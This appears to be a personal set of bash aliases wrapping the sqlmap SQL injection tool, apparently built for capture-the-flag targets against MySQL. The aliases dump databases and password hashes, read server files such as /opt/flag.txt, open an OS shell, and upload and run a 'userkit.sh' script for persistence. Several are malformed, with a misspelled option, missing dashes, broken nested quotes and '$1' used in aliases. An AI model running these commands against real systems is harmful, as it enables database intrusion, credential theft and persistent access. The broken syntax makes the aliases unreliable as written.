alias sqlmap-TEMPER='sqlmap -r $1 --batch --threads=3 --level=5 --risk=3 --alert='echo -e "\e[1;32mSQL INJECTION FOUND!!!!!....\e[0m"' --flush-session --dbms MYSQL --tamper=charencode.py'
alias sqlmap-ROLES="sqlmap $1 --batch --curent-user --roles --threads=3 --level=5 --risk=3 --dbms MYSQL"
alias sqlmap-PERSIST="sqlmap $1 --batch --file-dest=/tmp/userkit.sh --file-write=userkit.sh os-cmd='bash userkit.sh' --threads=3 --level=5 --risk=3 --dbms MYSQL"
alias sqlmap-READ="sqlmap $1 --batch --file-read=/opt/flag.txt --os-shell threads=3 --level=5 --risk=3 --dbms MYSQL"
alias sqlmap-DUMP="sqlmap $1 --batch --dbs --count --passwords --dump --threads=10 --level=5 --risk=3 --dbms MYSQL"
